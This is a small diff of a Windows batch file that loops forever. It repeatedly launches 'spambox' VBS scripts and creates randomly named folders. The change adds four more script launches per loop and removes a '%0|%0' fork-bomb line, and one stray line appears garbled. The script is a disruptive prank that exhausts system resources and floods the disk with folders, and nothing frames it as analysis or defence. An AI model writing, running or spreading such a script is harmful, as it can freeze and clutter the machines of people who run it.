@@ -11,7 +11,10 @@ goto b
  start spambox2.vbs
  start spambox3.vbs
  start spambox4.vbs
+ start spambox.vbs
+ start spambox2.vbs
+ start spambox3.vbs
+ start spambox4.vbs
 md %random%
 /folder.
-%0|%0
 goto b
